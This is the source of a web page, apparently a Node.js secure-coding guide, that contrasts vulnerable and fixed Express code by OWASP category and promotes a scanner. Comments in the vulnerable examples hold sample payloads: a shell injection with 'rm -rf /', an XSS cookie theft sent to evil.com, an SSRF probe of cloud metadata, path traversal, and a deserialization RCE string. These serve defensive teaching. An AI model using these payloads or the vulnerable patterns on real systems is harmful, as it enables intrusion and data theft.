import React from "react";
import type { Metadata } from "next";
import Link from "next/link";

export const metadata: Metadata = {
  title: "Node.js Security Guide 2025 — Best Practices, Vulnerabilities & Secure Code Examples",
  description:
    "The complete Node.js security guide for 2025: OWASP Top 10 mapped vulnerabilities, secure vs insecure code examples, dependency management, authentication hardening, and production security checklists.",
  keywords: [
    "Node.js security",
    "Node.js vulnerabilities",
    "Node.js secure coding",
    "Express.js security",
    "npm audit security",
    "Node.js injection prevention",
    "server-side JavaScript security",
    "Node.js authentication security",
    "Node.js OWASP",
    "Node.js SQL injection",
    "Node.js XSS prevention",
    "Node.js prototype pollution",
    "secure Node.js API",
    "Node.js security checklist",
  ],
  openGraph: {
    title: "Node.js Security Guide 2025 | SecureCodeReviews",
    description:
      "Complete Node.js security guide with code examples: OWASP Top 10 vulnerabilities, secure coding patterns, and production security checklists.",
    url: "https://securecodereviews.com/nodejs-security-guide",
    type: "article",
  },
  twitter: {
    card: "summary_large_image",
    title: "Node.js Security Guide 2025 | SecureCodeReviews",
    description:
      "Secure your Node.js apps — OWASP-mapped vulnerabilities, code examples, and production-ready security patterns.",
  },
  alternates: {
    canonical: "/nodejs-security-guide",
  },
};

/* ── Reusable code block component ── */
function CodeBlock({ title, code, variant }: { title: string; code: string; variant: "danger" | "safe" | "neutral" }) {
  const colors = {
    danger: "border-red-500/40 bg-red-950/30",
    safe: "border-emerald-500/40 bg-emerald-950/30",
    neutral: "border-zinc-600/40 bg-zinc-900/60",
  };
  const labels = { danger: "❌ Vulnerable", safe: "✅ Secure", neutral: "" };
  return (
    <div className={`rounded-lg border ${colors[variant]} p-4 my-4 not-prose`}>
      <div className="flex items-center gap-2 mb-2">
        {labels[variant] && <span className="text-xs font-semibold tracking-wide uppercase opacity-80">{labels[variant]}</span>}
        {title && <span className="text-xs text-zinc-400">{title}</span>}
      </div>
      <pre className="overflow-x-auto text-sm leading-relaxed"><code>{code}</code></pre>
    </div>
  );
}

export default function NodeJsSecurityGuidePage() {
  const jsonLd = {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    headline: "Node.js Security Guide 2025 — Best Practices, Vulnerabilities & Secure Code Examples",
    description: "The complete Node.js security guide for 2025 with OWASP-mapped vulnerabilities, secure vs insecure code examples, and production checklists.",
    url: "https://securecodereviews.com/nodejs-security-guide",
    datePublished: "2025-01-01",
    dateModified: new Date().toISOString().split("T")[0],
    publisher: { "@type": "Organization", name: "SecureCodeReviews", url: "https://securecodereviews.com" },
    mainEntityOfPage: "https://securecodereviews.com/nodejs-security-guide",
    about: { "@type": "Thing", name: "Node.js Security" },
  };

  return (
    <main className="max-w-4xl mx-auto px-4 py-12 prose prose-neutral dark:prose-invert">
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />

      <h1>Node.js Security Guide 2025</h1>
      <p className="lead text-lg text-zinc-400">
        Node.js powers millions of production APIs, microservices, and web applications.
        Its non-blocking I/O model and vast npm ecosystem make it incredibly productive — but also expose a large attack surface if security is not treated as a first-class concern.
        This guide maps every major risk to the <strong>OWASP Top 10 (2021)</strong>, includes real vulnerable-vs-secure code examples, and gives you a production-ready checklist.
      </p>

      <nav className="not-prose my-8 p-4 rounded-lg border border-zinc-700/50 bg-zinc-900/40">
        <p className="text-sm font-semibold text-zinc-300 mb-3">Table of Contents</p>
        <ol className="columns-2 gap-6 text-sm text-zinc-400 list-decimal list-inside space-y-1">
          <li><a href="#injection" className="hover:text-white transition-colors">Injection Attacks (SQLi, NoSQLi, Command)</a></li>
          <li><a href="#xss" className="hover:text-white transition-colors">Cross-Site Scripting (XSS)</a></li>
          <li><a href="#auth" className="hover:text-white transition-colors">Authentication & Session Security</a></li>
          <li><a href="#access-control" className="hover:text-white transition-colors">Broken Access Control</a></li>
          <li><a href="#dependencies" className="hover:text-white transition-colors">Dependency & Supply Chain Security</a></li>
          <li><a href="#prototype-pollution" className="hover:text-white transition-colors">Prototype Pollution</a></li>
          <li><a href="#ssrf" className="hover:text-white transition-colors">Server-Side Request Forgery (SSRF)</a></li>
          <li><a href="#file-uploads" className="hover:text-white transition-colors">Secure File Uploads</a></li>
          <li><a href="#secrets" className="hover:text-white transition-colors">Secrets Management</a></li>
          <li><a href="#headers" className="hover:text-white transition-colors">Security Headers & CORS</a></li>
          <li><a href="#crypto" className="hover:text-white transition-colors">Cryptography Best Practices</a></li>
          <li><a href="#error-handling" className="hover:text-white transition-colors">Error Handling & Logging</a></li>
          <li><a href="#rate-limiting" className="hover:text-white transition-colors">Rate Limiting & DoS Protection</a></li>
          <li><a href="#redos" className="hover:text-white transition-colors">ReDoS (Regex Denial of Service)</a></li>
          <li><a href="#deserialization" className="hover:text-white transition-colors">Insecure Deserialization</a></li>
          <li><a href="#https" className="hover:text-white transition-colors">HTTPS & Transport Security</a></li>
          <li><a href="#checklist" className="hover:text-white transition-colors">Production Security Checklist</a></li>
          <li><a href="#tools" className="hover:text-white transition-colors">Recommended Tools</a></li>
        </ol>
      </nav>

      {/* ── 1. Injection ── */}
      <h2 id="injection">1. Injection Attacks — SQL, NoSQL &amp; Command Injection</h2>
      <p>
        <strong>OWASP A03:2021 — Injection</strong> &bull; <strong>CWE-89, CWE-78, CWE-943</strong>
      </p>
      <p>
        Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.
        In Node.js, this commonly manifests in database queries, shell commands, and template engines.
      </p>

      <h3>SQL Injection</h3>
      <CodeBlock variant="danger" title="String concatenation in query" code={`// VULNERABLE: user input directly in SQL query
app.get("/api/users", async (req, res) => {
  const id = req.query.id;
  const result = await pool.query(
    "SELECT * FROM users WHERE id = " + id  // ← attacker sends: 1 OR 1=1
  );
  res.json(result.rows);
});`} />
      <CodeBlock variant="safe" title="Parameterized query" code={`// SECURE: parameterized query — input is escaped by the driver
app.get("/api/users", async (req, res) => {
  const id = req.query.id;
  const result = await pool.query(
    "SELECT * FROM users WHERE id = $1",
    [id]  // ← bound parameter, never interpreted as SQL
  );
  res.json(result.rows);
});`} />

      <h3>NoSQL Injection</h3>
      <CodeBlock variant="danger" title="Passing req.body directly to MongoDB" code={`// VULNERABLE: attacker sends { "$gt": "" } as username
app.post("/api/login", async (req, res) => {
  const user = await User.findOne({
    username: req.body.username,  // ← can be an operator object
    password: req.body.password,
  });
});`} />
      <CodeBlock variant="safe" title="Explicit field extraction + type check" code={`// SECURE: extract and validate types explicitly
app.post("/api/login", async (req, res) => {
  const username = String(req.body.username);
  const password = String(req.body.password);
  const user = await User.findOne({ username, password });
});`} />

      <h3>Command Injection</h3>
      <CodeBlock variant="danger" title="User input in shell command" code={`// VULNERABLE: attacker sends "127.0.0.1; rm -rf /"
app.get("/api/ping", (req, res) => {
  exec("ping -c 1 " + req.query.host, (err, stdout) => {
    res.send(stdout);
  });
});`} />
      <CodeBlock variant="safe" title="Allowlist + execFile" code={`// SECURE: use execFile (no shell) + validate input
app.get("/api/ping", (req, res) => {
  const host = req.query.host;
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: "Invalid host" });
  }
  execFile("ping", ["-c", "1", host], (err, stdout) => {
    res.send(stdout);
  });
});`} />

      {/* ── 2. XSS ── */}
      <h2 id="xss">2. Cross-Site Scripting (XSS)</h2>
      <p>
        <strong>OWASP A03:2021 — Injection</strong> &bull; <strong>CWE-79</strong>
      </p>
      <p>
        XSS allows attackers to inject client-side scripts into web pages viewed by other users.
        In Node.js backends, reflected XSS happens when user input is echoed back in HTML responses without encoding.
      </p>
      <CodeBlock variant="danger" title="Reflected XSS via res.send" code={`// VULNERABLE: user input directly in HTML response
app.get("/search", (req, res) => {
  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);
  // attacker sends: ?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
});`} />
      <CodeBlock variant="safe" title="Output encoding + CSP header" code={`import escape from "escape-html";

app.get("/search", (req, res) => {
  const safeQ = escape(req.query.q || "");
  res.set("Content-Security-Policy", "default-src 'self'; script-src 'self'");
  res.send(\`<h1>Results for: \${safeQ}</h1>\`);
});`} />
      <ul>
        <li>Always encode output: use <code>escape-html</code> for HTML context, <code>encodeURIComponent()</code> for URLs.</li>
        <li>Set <code>Content-Security-Policy</code> headers to block inline scripts.</li>
        <li>Use templating engines that auto-escape by default (Pug, Handlebars with escaping, React JSX).</li>
        <li>Never use <code>dangerouslySetInnerHTML</code> or <code>innerHTML</code> with user-controlled data.</li>
      </ul>

      {/* ── 3. Auth ── */}
      <h2 id="auth">3. Authentication &amp; Session Security</h2>
      <p>
        <strong>OWASP A07:2021 — Identification and Authentication Failures</strong> &bull; <strong>CWE-287, CWE-798</strong>
      </p>

      <h3>Password Hashing</h3>
      <CodeBlock variant="danger" title="Plain text or MD5 hashing" code={`// VULNERABLE: MD5 is not a password hashing function
const hash = crypto.createHash("md5").update(password).digest("hex");
if (hash === storedHash) { /* login */ }`} />
      <CodeBlock variant="safe" title="bcrypt with cost factor" code={`import bcrypt from "bcrypt";

// Registration — hash with cost factor 12
const hash = await bcrypt.hash(password, 12);

// Login — constant-time comparison built into bcrypt.compare
const valid = await bcrypt.compare(password, storedHash);`} />

      <h3>JWT Security</h3>
      <CodeBlock variant="danger" title="Hardcoded JWT secret" code={`// VULNERABLE: secret in source code, no expiration
const token = jwt.sign({ userId }, "my-secret-key-123");`} />
      <CodeBlock variant="safe" title="Environment variable + expiration + algorithm pinning" code={`const token = jwt.sign({ userId }, process.env.JWT_SECRET, {
  expiresIn: "1h",
  algorithm: "HS256",  // pin algorithm to prevent "none" algorithm attack
});

// Verification — always specify algorithms
jwt.verify(token, process.env.JWT_SECRET, { algorithms: ["HS256"] });`} />

      <h3>Session Cookies</h3>
      <ul>
        <li>Set <code>httpOnly: true</code> — prevents JavaScript access (mitigates XSS cookie theft).</li>
        <li>Set <code>secure: true</code> — cookies only sent over HTTPS.</li>
        <li>Set <code>sameSite: &quot;strict&quot;</code> or <code>&quot;lax&quot;</code> — mitigates CSRF.</li>
        <li>Use short session lifetimes and implement token rotation.</li>
        <li>Store sessions server-side (Redis, database) rather than in cookies for sensitive apps.</li>
      </ul>

      {/* ── 4. Access Control ── */}
      <h2 id="access-control">4. Broken Access Control</h2>
      <p>
        <strong>OWASP A01:2021 — Broken Access Control</strong> &bull; <strong>CWE-284, CWE-639</strong>
      </p>
      <CodeBlock variant="danger" title="No authorization check" code={`// VULNERABLE: any authenticated user can access any account
app.get("/api/account/:id", authMiddleware, async (req, res) => {
  const account = await Account.findById(req.params.id);
  res.json(account);  // ← user A can read user B's data by guessing ID
});`} />
      <CodeBlock variant="safe" title="Ownership + role-based check" code={`app.get("/api/account/:id", authMiddleware, async (req, res) => {
  const account = await Account.findById(req.params.id);
  if (!account) return res.status(404).json({ error: "Not found" });

  // Verify ownership or admin role
  if (account.userId !== req.user.id && req.user.role !== "admin") {
    return res.status(403).json({ error: "Forbidden" });
  }
  res.json(account);
});`} />
      <ul>
        <li>Always verify the requesting user owns the resource or has the required role.</li>
        <li>Deny by default — require explicit permission grants for each endpoint.</li>
        <li>Use middleware to enforce role-based access control (RBAC) consistently.</li>
        <li>Log authorization failures for security monitoring.</li>
      </ul>

      {/* ── 5. Dependencies ── */}
      <h2 id="dependencies">5. Dependency &amp; Supply Chain Security</h2>
      <p>
        <strong>OWASP A06:2021 — Vulnerable and Outdated Components</strong> &bull; <strong>CWE-1104</strong>
      </p>
      <p>
        The average Node.js project pulls in hundreds of transitive dependencies from npm.
        A single compromised or vulnerable package can expose your entire application.
      </p>
      <CodeBlock variant="neutral" title="Audit and fix dependencies" code={`# Check for known vulnerabilities
npm audit

# Auto-fix when possible
npm audit fix

# Check for outdated packages
npm outdated

# Use lockfile-lint to detect lockfile tampering
npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm`} />
      <ul>
        <li>Run <code>npm audit</code> in CI/CD pipelines — fail the build on critical/high findings.</li>
        <li>Pin exact dependency versions in production (<code>&quot;lodash&quot;: &quot;4.17.21&quot;</code> not <code>&quot;^4.17.0&quot;</code>).</li>
        <li>Review new dependencies before adding: check maintenance activity, download counts, and known issues.</li>
        <li>Use <code>package-lock.json</code> and commit it to source control to prevent supply-chain attacks via version drift.</li>
        <li>Consider using <code>npm ci</code> in production builds for deterministic installs.</li>
        <li>Use <Link href="/shieldx" className="text-emerald-400 hover:underline">ShieldX SAST Scanner</Link> to scan your project code for vulnerabilities alongside dependency checks.</li>
      </ul>

      {/* ── 6. Prototype Pollution ── */}
      <h2 id="prototype-pollution">6. Prototype Pollution</h2>
      <p>
        <strong>OWASP A03:2021 — Injection</strong> &bull; <strong>CWE-1321</strong>
      </p>
      <p>
        Prototype pollution occurs when an attacker can inject properties into JavaScript&apos;s <code>Object.prototype</code>,
        which then affects all objects in the application. This is especially dangerous in Node.js because a single polluted prototype
        can escalate to RCE (Remote Code Execution) through certain libraries.
      </p>
      <CodeBlock variant="danger" title="Deep merge of user input" code={`import _ from "lodash";

// VULNERABLE: attacker sends { "__proto__": { "isAdmin": true } }
app.post("/api/config", (req, res) => {
  const config = {};
  _.merge(config, req.body);
  // Now ({}).isAdmin === true for ALL objects in the process!
});`} />
      <CodeBlock variant="safe" title="Schema validation + Object.create(null)" code={`import { z } from "zod";

const configSchema = z.object({
  theme: z.enum(["light", "dark"]),
  language: z.string().max(5),
});

app.post("/api/config", (req, res) => {
  const parsed = configSchema.parse(req.body); // rejects unexpected keys
  const config = Object.create(null);          // no prototype chain
  Object.assign(config, parsed);
});`} />
      <ul>
        <li>Never pass raw request bodies to <code>_.merge</code>, <code>_.defaultsDeep</code>, or <code>Object.assign</code>.</li>
        <li>Validate and allowlist input keys using Zod, Joi, or similar schema validators.</li>
        <li>Use <code>Object.create(null)</code> for dictionaries that should not inherit from <code>Object.prototype</code>.</li>
        <li>Keep lodash updated — older versions have known prototype pollution CVEs.</li>
      </ul>

      {/* ── 7. SSRF ── */}
      <h2 id="ssrf">7. Server-Side Request Forgery (SSRF)</h2>
      <p>
        <strong>OWASP A10:2021 — SSRF</strong> &bull; <strong>CWE-918</strong>
      </p>
      <CodeBlock variant="danger" title="User-controlled URL in fetch" code={`// VULNERABLE: attacker sends url=http://169.254.169.254/latest/meta-data/
app.get("/api/preview", async (req, res) => {
  const response = await fetch(req.query.url);  // ← fetches AWS metadata endpoint
  const html = await response.text();
  res.send(html);
});`} />
      <CodeBlock variant="safe" title="URL allowlist + private IP block" code={`import { URL } from "url";

const ALLOWED_HOSTS = new Set(["api.example.com", "cdn.example.com"]);

app.get("/api/preview", async (req, res) => {
  const parsed = new URL(req.query.url);

  // Block private IPs and non-allowed hosts
  if (!ALLOWED_HOSTS.has(parsed.hostname)) {
    return res.status(403).json({ error: "Host not allowed" });
  }
  if (parsed.protocol !== "https:") {
    return res.status(400).json({ error: "HTTPS required" });
  }

  const response = await fetch(parsed.toString());
  res.send(await response.text());
});`} />

      {/* ── 8. File Uploads ── */}
      <h2 id="file-uploads">8. Secure File Uploads</h2>
      <p>
        <strong>OWASP A04:2021 — Insecure Design</strong> &bull; <strong>CWE-434</strong>
      </p>
      <CodeBlock variant="danger" title="No validation on uploads" code={`// VULNERABLE: no file type, size, or name validation
app.post("/upload", upload.single("file"), (req, res) => {
  const dest = path.join("/uploads", req.file.originalname);
  fs.renameSync(req.file.path, dest);  // ← path traversal via "../../etc/passwd"
});`} />
      <CodeBlock variant="safe" title="Validated upload with limits" code={`import { randomUUID } from "crypto";
import path from "path";

const ALLOWED_TYPES = new Set(["image/jpeg", "image/png", "application/pdf"]);
const MAX_SIZE = 10 * 1024 * 1024; // 10 MB

app.post("/upload", upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  if (!ALLOWED_TYPES.has(req.file.mimetype)) {
    return res.status(400).json({ error: "File type not allowed" });
  }
  if (req.file.size > MAX_SIZE) {
    return res.status(400).json({ error: "File too large" });
  }

  // Use random name to prevent path traversal and overwrites
  const ext = path.extname(req.file.originalname).toLowerCase();
  const safeName = randomUUID() + ext;
  const dest = path.join("/uploads", safeName);

  // Verify resolved path is within upload directory
  if (!dest.startsWith("/uploads/")) {
    return res.status(400).json({ error: "Invalid path" });
  }
  fs.renameSync(req.file.path, dest);
  res.json({ filename: safeName });
});`} />

      {/* ── 9. Secrets ── */}
      <h2 id="secrets">9. Secrets Management</h2>
      <p>
        <strong>OWASP A07:2021 — Identification and Authentication Failures</strong> &bull; <strong>CWE-798</strong>
      </p>
      <CodeBlock variant="danger" title="Hardcoded credentials" code={`// VULNERABLE: credentials in source code
const db = new Pool({
  user: "admin",
  password: "SuperSecret123!",
  host: "db.production.internal",
});`} />
      <CodeBlock variant="safe" title="Environment variables + .env file" code={`// SECURE: credentials from environment
const db = new Pool({
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  host: process.env.DB_HOST,
  ssl: { rejectUnauthorized: true },
});

// .env file (NEVER committed to git)
// DB_USER=admin
// DB_PASSWORD=SuperSecret123!
// DB_HOST=db.production.internal`} />
      <ul>
        <li>Never commit <code>.env</code> files or secrets to source control — add <code>.env</code> to <code>.gitignore</code>.</li>
        <li>Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler) in production.</li>
        <li>Rotate API keys and database credentials on a regular schedule.</li>
        <li>Use separate credentials for development, staging, and production environments.</li>
        <li>Audit your codebase with <Link href="/shieldx" className="text-emerald-400 hover:underline">ShieldX</Link> to detect hardcoded secrets automatically.</li>
      </ul>

      {/* ── 10. Headers & CORS ── */}
      <h2 id="headers">10. Security Headers &amp; CORS</h2>
      <p>
        <strong>OWASP A05:2021 — Security Misconfiguration</strong> &bull; <strong>CWE-693, CWE-942</strong>
      </p>
      <CodeBlock variant="danger" title="Wildcard CORS with credentials" code={`// VULNERABLE: accepts requests from any origin with credentials
app.use(cors({
  origin: "*",
  credentials: true,
}));`} />
      <CodeBlock variant="safe" title="Restricted origin + helmet headers" code={`import helmet from "helmet";
import cors from "cors";

app.use(helmet());  // sets 15+ security headers automatically
app.use(cors({
  origin: ["https://app.example.com", "https://admin.example.com"],
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));`} />
      <p>Security headers set by <code>helmet</code>:</p>
      <ul>
        <li><code>Strict-Transport-Security</code> — forces HTTPS for future requests.</li>
        <li><code>X-Content-Type-Options: nosniff</code> — prevents MIME-type sniffing.</li>
        <li><code>X-Frame-Options: DENY</code> — prevents clickjacking via iframes.</li>
        <li><code>Content-Security-Policy</code> — controls which resources can load on the page.</li>
        <li><code>Referrer-Policy</code> — controls how much referrer info is sent.</li>
        <li><code>Permissions-Policy</code> — disables browser features you don&apos;t use (camera, microphone, etc.).</li>
      </ul>

      {/* ── 11. Crypto ── */}
      <h2 id="crypto">11. Cryptography Best Practices</h2>
      <p>
        <strong>OWASP A02:2021 — Cryptographic Failures</strong> &bull; <strong>CWE-327, CWE-330</strong>
      </p>
      <CodeBlock variant="danger" title="Weak hash + Math.random for tokens" code={`// VULNERABLE: MD5 is broken for integrity, Math.random is predictable
const checksum = crypto.createHash("md5").update(data).digest("hex");
const token = Math.random().toString(36).slice(2);`} />
      <CodeBlock variant="safe" title="Strong algorithms + crypto.randomBytes" code={`// SECURE: SHA-256 for integrity, crypto for randomness
const checksum = crypto.createHash("sha256").update(data).digest("hex");
const token = crypto.randomBytes(32).toString("hex");
const uuid = crypto.randomUUID();`} />
      <ul>
        <li>Use <strong>SHA-256+</strong> for hashing, <strong>AES-256-GCM</strong> for encryption, <strong>bcrypt/argon2</strong> for passwords.</li>
        <li>Never use <code>MD5</code>, <code>SHA-1</code>, or <code>Math.random()</code> for anything security-sensitive.</li>
        <li>Use <code>crypto.randomBytes()</code> or <code>crypto.randomUUID()</code> for tokens, nonces, and session IDs.</li>
        <li>Use <code>crypto.timingSafeEqual()</code> for comparing secrets to prevent timing attacks.</li>
      </ul>

      {/* ── 12. Error Handling ── */}
      <h2 id="error-handling">12. Error Handling &amp; Logging</h2>
      <p>
        <strong>OWASP A09:2021 — Security Logging and Monitoring Failures</strong> &bull; <strong>CWE-209, CWE-532</strong>
      </p>
      <CodeBlock variant="danger" title="Exposing stack traces to users" code={`// VULNERABLE: leaks internal paths, library versions, DB schema
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,  // ← attacker sees: at /app/src/db/users.js:42:15
  });
});`} />
      <CodeBlock variant="safe" title="Generic error to client, detailed log server-side" code={`import pino from "pino";
const logger = pino({ level: "info" });

app.use((err, req, res, next) => {
  // Log full details server-side
  logger.error({ err, url: req.url, method: req.method }, "Unhandled error");

  // Generic message to client
  res.status(500).json({ error: "Internal server error" });
});`} />
      <ul>
        <li>Never expose stack traces, error messages, or internal paths in production responses.</li>
        <li>Use structured logging (<code>pino</code>, <code>winston</code>) for aggregation and alerting.</li>
        <li>Log security events: failed logins, authorization failures, input validation errors.</li>
        <li>Do not log sensitive data (passwords, tokens, PII) — redact before logging.</li>
      </ul>

      {/* ── 13. Rate Limiting ── */}
      <h2 id="rate-limiting">13. Rate Limiting &amp; DoS Protection</h2>
      <p>
        <strong>OWASP A04:2021 — Insecure Design</strong> &bull; <strong>CWE-770</strong>
      </p>
      <CodeBlock variant="safe" title="express-rate-limit middleware" code={`import rateLimit from "express-rate-limit";

// Global rate limit: 100 requests per 15 minutes per IP
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Too many requests, try again later" },
}));

// Stricter limit on login endpoint
app.post("/api/login", rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // only 5 login attempts per 15 mins
}), loginHandler);`} />
      <ul>
        <li>Apply global rate limiting and stricter limits on auth endpoints.</li>
        <li>Use <code>express-rate-limit</code> with a Redis/Memcached store in multi-instance deployments.</li>
        <li>Set request body size limits: <code>express.json(&#123; limit: &quot;1mb&quot; &#125;)</code>.</li>
        <li>Set request timeouts to prevent slowloris-style attacks.</li>
      </ul>

      {/* ── 14. ReDoS ── */}
      <h2 id="redos">14. ReDoS (Regular Expression Denial of Service)</h2>
      <p>
        <strong>OWASP A04:2021 — Insecure Design</strong> &bull; <strong>CWE-1333</strong>
      </p>
      <p>
        Poorly written regular expressions can be exploited to cause catastrophic backtracking,
        freezing the event loop and denying service to all users.
      </p>
      <CodeBlock variant="danger" title="Vulnerable regex with nested quantifiers" code={`// VULNERABLE: catastrophic backtracking on long input
const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\\.[a-zA-Z]+$/;
if (emailRegex.test(userInput)) { /* ... */ }
// Input "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" causes ~2^28 operations`} />
      <CodeBlock variant="safe" title="Safe regex + timeout" code={`// SECURE: use a well-tested email validation library
import { z } from "zod";
const schema = z.object({ email: z.string().email() });

// Or use RE2 for guaranteed linear-time matching
import RE2 from "re2";
const safeRegex = new RE2("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$");`} />

      {/* ── 15. Deserialization ── */}
      <h2 id="deserialization">15. Insecure Deserialization</h2>
      <p>
        <strong>OWASP A08:2021 — Software and Data Integrity Failures</strong> &bull; <strong>CWE-502</strong>
      </p>
      <CodeBlock variant="danger" title="Deserializing untrusted data" code={`import serialize from "node-serialize";

// VULNERABLE: enables Remote Code Execution (RCE)
app.post("/api/restore", (req, res) => {
  const obj = serialize.unserialize(req.body.data);
  // attacker sends: {"exploit":"_$$ND_FUNC$$_function(){require('child_process').exec('...')}()"}
});`} />
      <CodeBlock variant="safe" title="Use JSON.parse with schema validation" code={`import { z } from "zod";

const restoreSchema = z.object({
  name: z.string().max(100),
  settings: z.record(z.string()),
});

app.post("/api/restore", (req, res) => {
  const data = restoreSchema.parse(JSON.parse(req.body.data));
  // Only accepted fields pass through; no code execution possible
});`} />

      {/* ── 16. HTTPS ── */}
      <h2 id="https">16. HTTPS &amp; Transport Security</h2>
      <p>
        <strong>OWASP A02:2021 — Cryptographic Failures</strong> &bull; <strong>CWE-319</strong>
      </p>
      <ul>
        <li>Enforce HTTPS using HSTS headers: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>.</li>
        <li>Redirect all HTTP traffic to HTTPS at the load balancer or reverse proxy level.</li>
        <li>Never transmit tokens, passwords, or PII over plain HTTP.</li>
        <li>Use TLS 1.2+ only — disable TLS 1.0 and 1.1 in your Node.js <code>tls.createServer</code> options.</li>
        <li>Validate TLS certificates in outbound requests (<code>rejectUnauthorized: true</code>).</li>
      </ul>

      {/* ── 17. Checklist ── */}
      <h2 id="checklist">17. Production Security Checklist</h2>
      <div className="not-prose my-6">
        <div className="grid gap-2">
          {[
            "All dependencies audited with npm audit — no critical/high findings",
            "Input validation on every endpoint using Zod, Joi, or equivalent",
            "Parameterized queries for all database operations",
            "bcrypt or argon2 for password hashing with cost factor ≥ 12",
            "JWT secrets loaded from environment variables with expiration and algorithm pinning",
            "helmet middleware enabled with Content-Security-Policy configured",
            "CORS restricted to specific origins — no wildcard with credentials",
            "Rate limiting on all endpoints, stricter on auth routes",
            "File uploads validated: type, size, random filename, path validation",
            "No hardcoded secrets, API keys, or credentials in source code",
            "Error responses never expose stack traces or internal details",
            "Structured logging with security event monitoring (failed logins, authz failures)",
            "HTTPS enforced with HSTS header and TLS 1.2+",
            "Session cookies set with httpOnly, secure, and sameSite flags",
            "Process runs as non-root user in production containers",
            "Node.js version is actively maintained (LTS) and up to date",
            "SAST scanning integrated in CI/CD pipeline",
          ].map((item, i) => (
            <label key={i} className="flex items-start gap-3 p-2 rounded hover:bg-zinc-800/50 transition-colors cursor-pointer">
              <input type="checkbox" className="mt-1 accent-emerald-500" />
              <span className="text-sm text-zinc-300">{item}</span>
            </label>
          ))}
        </div>
      </div>

      {/* ── 18. Tools ── */}
      <h2 id="tools">18. Recommended Security Tools</h2>
      <div className="not-prose my-6">
        <div className="grid gap-3 sm:grid-cols-2">
          {[
            { name: "ShieldX by SecureCodeReviews", href: "/shieldx", desc: "SAST scanner for JS/TS/Java/C++/C# — catches 50+ vulnerability types with zero false positives", highlight: true },
            { name: "helmet", href: "https://www.npmjs.com/package/helmet", desc: "Sets 15+ security HTTP headers automatically" },
            { name: "express-rate-limit", href: "https://www.npmjs.com/package/express-rate-limit", desc: "IP-based rate limiting middleware" },
            { name: "zod", href: "https://www.npmjs.com/package/zod", desc: "Type-safe input validation and schema parsing" },
            { name: "joi", href: "https://www.npmjs.com/package/joi", desc: "Powerful object schema validation" },
            { name: "pino", href: "https://www.npmjs.com/package/pino", desc: "Ultra-fast structured logging" },
            { name: "npm audit", href: "https://docs.npmjs.com/cli/commands/npm-audit", desc: "Built-in dependency vulnerability scanner" },
            { name: "RE2", href: "https://www.npmjs.com/package/re2", desc: "Safe regex engine immune to ReDoS" },
          ].map((tool, i) => (
            <a
              key={i}
              href={tool.href}
              target={tool.href.startsWith("/") ? undefined : "_blank"}
              rel={tool.href.startsWith("/") ? undefined : "noopener noreferrer"}
              className={`block p-3 rounded-lg border transition-colors ${
                tool.highlight
                  ? "border-emerald-500/50 bg-emerald-950/20 hover:bg-emerald-950/40"
                  : "border-zinc-700/50 bg-zinc-900/40 hover:bg-zinc-800/60"
              }`}
            >
              <p className={`text-sm font-semibold ${tool.highlight ? "text-emerald-400" : "text-zinc-200"}`}>{tool.name}</p>
              <p className="text-xs text-zinc-400 mt-1">{tool.desc}</p>
            </a>
          ))}
        </div>
      </div>

      {/* ── Further Reading ── */}
      <h2>Further Reading</h2>
      <ul>
        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP Node.js Security Cheat Sheet</a></li>
        <li><a href="https://nodejs.org/en/learn/getting-started/security-best-practices" target="_blank" rel="noopener noreferrer">Node.js Official Security Best Practices</a></li>
        <li><a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">OWASP Top 10 (2021)</a></li>
        <li><a href="https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html" target="_blank" rel="noopener noreferrer">CWE Top 25 Most Dangerous Software Weaknesses</a></li>
      </ul>

      <hr />
      <div className="not-prose my-8 p-6 rounded-xl border border-emerald-500/30 bg-emerald-950/20 text-center">
        <p className="text-lg font-semibold text-white mb-2">Scan Your Node.js Code for Free</p>
        <p className="text-sm text-zinc-400 mb-4">
          ShieldX detects SQL injection, XSS, command injection, hardcoded secrets, prototype pollution, and 50+ more vulnerability types — directly in your browser, no install needed.
        </p>
        <Link
          href="/shieldx"
          className="inline-block px-6 py-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-sm transition-colors"
        >
          Try ShieldX Free →
        </Link>
      </div>
    </main>
  );
}
